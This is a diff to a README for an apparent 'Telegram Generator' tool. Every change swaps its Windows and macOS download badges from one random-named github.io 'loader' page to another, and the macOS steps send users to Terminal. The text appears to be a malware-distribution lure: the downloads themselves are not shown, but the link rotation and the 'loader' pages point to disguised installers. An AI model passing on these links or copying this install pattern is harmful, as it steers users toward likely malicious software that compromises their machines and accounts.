@@ -27,7 +27,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Telegram_Generator-26A5E4?style=for-the-badge&logo=telegram)](https://lpysehglnrlc.github.io/win-loader/)
+[![Download](https://img.shields.io/badge/⬇_Download_Telegram_Generator-26A5E4?style=for-the-badge&logo=telegram)](https://mefvwsuclquj.github.io/setup-win/)
 
 </div>
 
@@ -60,9 +60,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://lpysehglnrlc.github.io/win-loader/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mefvwsuclquj.github.io/setup-win/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://lpysehglnrlc.github.io/mac-loader/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mefvwsuclquj.github.io/install-mac/)
 
 </div>
 
@@ -75,7 +75,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Telegram_Generator-26A5E4?style=for-the-badge&logo=telegram)](https://lpysehglnrlc.github.io/win-loader/)
+[![Download](https://img.shields.io/badge/⬇_Download_Telegram_Generator-26A5E4?style=for-the-badge&logo=telegram)](https://mefvwsuclquj.github.io/setup-win/)
 
 </div>
 
@@ -106,7 +106,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://lpysehglnrlc.github.io/mac-loader/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mefvwsuclquj.github.io/install-mac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -131,7 +131,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Telegram_Generator-26A5E4?style=for-the-badge&logo=telegram)](https://lpysehglnrlc.github.io/win-loader/)
+[![Download](https://img.shields.io/badge/⬇_Download_Telegram_Generator-26A5E4?style=for-the-badge&logo=telegram)](https://mefvwsuclquj.github.io/setup-win/)
 
 </div>
 
